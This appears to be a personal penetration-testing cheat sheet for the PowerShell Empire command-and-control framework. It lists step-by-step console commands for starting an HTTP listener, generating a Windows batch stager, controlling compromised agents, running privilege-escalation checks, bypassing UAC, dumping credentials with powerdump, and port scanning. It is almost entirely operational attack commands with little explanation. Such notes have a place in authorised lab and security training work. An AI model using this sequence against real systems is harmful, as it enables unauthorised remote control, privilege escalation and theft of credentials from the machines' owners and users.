# 💢 powershell empire

Tags: #💢 
Related to: 
See also: 
Previous: [[Post Exploitation]]


## Description

## Usage Examples

### Clear database
	cd /opt/empire  
	sudo ./reset.sh

### Search for modules
    searchmodule privesc

### Configure a listener.

	listeners
	uselistener <Tab><Tab>
	uselistener http
	info

	set DefaultDelay 1
	set Port 8080
	set Host http://10.10.10.100:8080
	?
	execute

	listeners
	back

### Deploy an agent.

	usestager <Tab><Tab>
	usestager windows/launcher_bat
	info

	set Listener http
	generate

### Interact with agent

	agents
	interact AgentName
	?
	info
	list agents

### Use modules

	usemodule <Tab><Tab>
	usemodule situational_awareness/host/winenum
	info
	run		// Wait about 30 seconds and look through its output
	<Enter>

### Find privilege escalation

	back
	searchmodule powerup
	use privesc/powerup/allchecks
	run

	usemodule powershell/credentials/powerdump*	// The module ends with *, indicating that it requires an elevated privilege process to use it.
	info
	run

### UAC bypass

	back
	back
	usemodule privesc/ask
	info
	list listeners
	set Listener http
	run
	y <Enter>

	agents
	rename [NewSessionPseudoRandomName] AgentHIGH
	interact AgentHIGH
	usemodule powershell/credentials/powerdump*
	run

	back
	shell ipconfig
	shell whoami

### Port scan

	searchmodule portscan
	usemodule situational_awareness/network/portscan
	info
	set Hosts 10.10.10.10
	run

### Wrap up

	main
	agents
	kill all
	listeners
	kill http
	exit
	<y><Enter>

# References

https://github.com/EmpireProject/Empire